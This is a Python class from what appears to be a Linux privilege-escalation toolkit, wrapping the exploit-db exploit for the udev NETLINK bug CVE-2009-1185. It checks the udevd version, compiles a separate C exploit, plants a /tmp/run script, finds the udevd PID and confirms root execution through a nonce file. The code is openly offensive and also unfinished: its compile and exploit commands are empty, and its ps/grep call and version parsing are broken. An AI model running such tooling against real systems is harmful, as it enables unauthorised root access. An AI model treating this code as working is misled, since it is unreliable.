"""
adapted from:
https://www.exploit-db.com/exploits/8572/
"""
import os
import uuid
import subprocess
from exploits.exploit import Exploit
from constants import LINUX_EXPLOIT_PATH, PLAYGROUND_PATH, HIGH_RELIABILITY

class CVE20091185(Exploit):
	def __init__(self):
		super().__init__()
		self.name = "CVE-2009-1185"
		self.brief_desc = "udev before 1.4.1 NETLINK user space priv esc"
		self.longer_desc = "udev before 1.4.1 does not verify whether a NETLINK message originates from kernel " \
			"space, which allows local users to gain privileges by sending a NETLINK message from user space."
		self.reliability = HIGH_RELIABILITY
		self.source_c_path = os.path.join(LINUX_EXPLOIT_PATH, "CVE20091185.c")
		self.compilation_path = os.path.join(PLAYGROUND_PATH, "exploit")
		self.compilation_command = ""
		self.exploit_command = ""
		self.vulnerable_kernels = {
			"confirmed": [],
			"potential": [
				"all"
			]
		}

	def determine_vulnerability(self):
		# popen for backwards compatibility to 2.7
		p = subprocess.Popen(
			["udevd", "--version"],
			stdin=subprocess.PIPE,
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			shell=True
		)
		udev_v = p.communicate()[1].decode('utf-8').replace("\n","").replace("--version: ", "")

		if "not found" in udev_v:
			self.exploit_failure("not vulnerable: ({})".format(udev_v))
			return False
		elif int(udev_v) < 141:
			print("\t[*] udev version: {}".format(udev_v))
			print("\t[+] vulnerable to CVE20091185!")
			return True

	def confirm_exploitation(self, nonce_to_confirm):
		"""
		confirm_exploitation

		Checks to see if the nonce was written to /tmp/nonce by the exploit
		:return: True or False
		"""
		socket_call = subprocess.Popen(
			["cat", "/tmp/nonce"],
			stdin=subprocess.PIPE,
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			shell=True
		)
		call_result = socket_call.communicate()[0].decode('utf-8')

		if call_result == nonce_to_confirm:
			return True

		return False

	def parse_udevd_netlink_socket_from_grep(self, grep_results):
		for rline in grep_results:
			if "/udevd" in rline:
				return int(rline.split("\t")[1])
		return 0

	def exploit(self):
		print("\t[*] attempting to exploit {}".format(self.name))
		vuln = self.determine_vulnerability()
		if vuln:
			print("\t[*] compiling: \'{}\'".format(" ".join(self.compilation_command)))
			return_code = subprocess.call(self.compilation_command)
			if return_code == 0 and os.path.exists(self.compilation_path): # TODO: complete command setup (find proc numb...etc)
				print("\t[*] setting up /tmp/run for execution ...")
				root_nonce = uuid.uuid4().hex
				tmp_run = """
#!/bin/bash
echo {} > /tmp/nonce			
				""".format(root_nonce)
				# write tmp_run to /tmp/run
				with open("/tmp/run", 'w') as run_file:
					run_file.write(tmp_run)

				print("\t[*] identifying udevd netlink socket PID ...")
				socket_call = subprocess.Popen(
					["ps", "aux" "|" "grep" "udevd"],
					stdin=subprocess.PIPE,
					stdout=subprocess.PIPE,
					stderr=subprocess.PIPE,
					shell=True
				)
				call_result = socket_call.communicate()[0].decode('utf-8').split("\n")
				socket_pid = self.parse_udevd_netlink_socket_from_grep(call_result)
				if socket_pid == 0:
					self.exploit_failure("could not get udevd netlink socket PID")
				else:
					print("\t[*] running compiled exploit with necessary args")
					subprocess.call(self.exploit_command)
					if self.confirm_exploitation(root_nonce):
						print("\t[+] exploitation of CVE20091185 successful!")
					else:
						self.exploit_failure("no exploitation output")
		else:
			self.exploit_failure("not vulnerable to CVE20091185")
